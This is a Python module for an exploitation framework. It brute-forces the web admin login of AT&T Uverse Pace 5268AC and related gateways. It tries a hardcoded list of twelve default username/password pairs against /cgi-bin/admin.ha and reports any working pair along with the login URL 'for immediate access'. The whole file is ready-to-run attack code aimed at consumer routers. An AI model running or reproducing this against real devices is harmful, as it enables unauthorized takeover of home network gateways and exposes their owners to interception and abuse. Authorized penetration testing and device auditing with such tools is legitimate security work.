# Author: André Henrique (LinkedIn/X: @mrhenrike)
from embedxpl.core.exploit import *
from embedxpl.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    """AT&T Uverse Pace 5268AC — Web Interface Default Credentials Tester.

    Performs a dictionary-style authentication check against the Pace 5268AC
    web management interface using all known default credential pairs.
    Covers the admin panel at ``/cgi-bin/admin.ha`` and the alternate
    ``/cgi-bin/webpg.ha`` endpoint.

    Known default pairs tested:
      - admin / admin
      - tech  / (blank)
      - attadmin / (blank)
      - user / (blank)
      - root / admin

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "AT&T Uverse Pace 5268AC Web Interface Default Credentials",
        "description": (
            "Tests the AT&T Uverse Pace 5268AC web management interface for "
            "authentication using all known default credential pairs.  Reports "
            "valid combinations and the login URL for immediate access.  "
            "Affected firmware versions < 9.x."
        ),
        "authors": (
            "AT&T / Pace vulnerability research community",
            "André Henrique (@mrhenrike)",
        ),
        "references": (
            "https://www.exploit-db.com/exploits/42038",
            "https://www.att.com/internet/u-verse/",
            "https://www.cvedetails.com/vendor/att",
        ),
        "devices": (
            "AT&T Uverse Pace 5268AC (firmware < 9.x)",
            "AT&T Uverse Pace 5168N",
            "AT&T Uverse Motorola NVG510",
            "AT&T Uverse NVG589",
            "AT&T Uverse NVG599",
        ),
    }

    target = OptIP("", "Target IPv4 address (gateway LAN IP)")
    port = OptPort(80, "Target HTTP management port")
    ssl = OptBool(False, "SSL enabled: true/false")
    stop_on_first = OptBool(True, "Stop after first valid credential pair is found")
    verbosity = OptBool(True, "Show each credential attempt")

    _LOGIN_PATH = "/cgi-bin/admin.ha"

    _DEFAULT_CREDS = [
        ("admin",    "admin"),
        ("admin",    ""),
        ("tech",     ""),
        ("tech",     "tech"),
        ("attadmin", ""),
        ("attadmin", "attadmin"),
        ("user",     ""),
        ("user",     "user"),
        ("root",     ""),
        ("root",     "admin"),
        ("cusadmin", "highspeed"),
        ("mso",      ""),
    ]

    def run(self) -> None:
        if not self.check():
            print_error(
                "Target {}:{} is not reachable or not a Pace 5268AC".format(
                    self.target, self.port
                )
            )
            return

        print_status("Starting default credential sweep against {}:{}".format(self.target, self.port))
        self.credentials = []

        for username, password in self._DEFAULT_CREDS:
            display_pw = "'{}'".format(password) if password else "(blank)"
            if self.verbosity:
                print_status("Trying {} / {} ...".format(username, display_pw))

            if self._try_login(username, password):
                print_success(
                    "Valid credentials: username='{}' password={}".format(username, display_pw)
                )
                print_info(
                    "Login URL: http://{}:{}{} ".format(self.target, self.port, self._LOGIN_PATH)
                )
                self.credentials.append((self.target, self.port, "HTTP", username, password))
                if self.stop_on_first:
                    return

        if self.credentials:
            print_success("\nAll valid credentials found:")
            print_table(
                ("Target", "Port", "Protocol", "Username", "Password"),
                *self.credentials,
            )
        else:
            print_error("No default credentials matched — device may use a custom PIN or patched firmware")

    @mute
    def check(self) -> bool:
        resp = self.http_request(method="GET", path=self._LOGIN_PATH)
        if resp is not None and resp.status_code in (200, 301, 302, 401, 403):
            return True
        resp2 = self.http_request(method="GET", path="/")
        return resp2 is not None and resp2.status_code in (200, 301, 302)

    def _try_login(self, username: str, password: str) -> bool:
        post_data = "username={}&password={}".format(
            utils.url_encode(username), utils.url_encode(password)
        )
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": "http://{}:{}{}".format(self.target, self.port, self._LOGIN_PATH),
        }
        resp = self.http_request(
            method="POST",
            path=self._LOGIN_PATH,
            data=post_data,
            headers=headers,
        )
        if resp is None:
            return False

        body = (resp.text or "").lower()

        if resp.status_code in (200, 302):
            success_markers = [
                "logout", "signout", "configuration", "advanced",
                "diagnostics", "home", "dashboard", "admin",
            ]
            if any(m in body for m in success_markers):
                return True

        if resp.status_code == 302:
            location = resp.headers.get("Location", "").lower()
            if any(m in location for m in ("admin", "home", "main", "dashboard")):
                return True

        return False
